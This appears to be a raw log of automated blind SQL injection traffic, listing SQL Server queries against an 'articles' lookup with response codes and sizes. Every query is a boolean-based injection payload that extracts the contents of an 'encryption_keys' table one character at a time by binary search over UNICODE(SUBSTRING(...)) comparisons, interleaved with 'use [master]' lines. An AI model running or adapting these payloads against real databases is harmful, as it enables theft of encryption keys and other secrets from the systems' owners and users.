+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),22,1))>104	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),22,1))>100	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),22,1))>102	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),22,1))>103	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),23,1))>96	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),23,1))>112	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),23,1))>104	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),23,1))>108	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),23,1))>110	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),23,1))>111	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),24,1))>96	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),24,1))>112	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),24,1))>120	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),24,1))>116	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),24,1))>114	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),24,1))>115	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),25,1))>96	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),25,1))>48	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),25,1))>1	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),25,1))>24	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),25,1))>36	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),25,1))>30	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),25,1))>33	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),25,1))>31	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),25,1))>32	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),26,1))>64	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),26,1))>96	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),26,1))>112	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),26,1))>104	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),26,1))>108	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),26,1))>106	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),26,1))>105	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),27,1))>96	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),27,1))>112	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),27,1))>120	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),27,1))>116	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),27,1))>114	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),27,1))>115	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),28,1))>96	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),28,1))>48	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),28,1))>1	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),28,1))>24	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),28,1))>36	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),28,1))>30	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),28,1))>33	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),28,1))>31	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),28,1))>32	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),29,1))>64	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),29,1))>32	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),29,1))>1	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>64	406
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>96	406
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>112	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>104	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>108	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>110	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>111	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>96	406
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>112	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>104	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>100	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>98	406
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>97	406
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>96	406
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>112	407
+	200
+use [master]	86
+	165
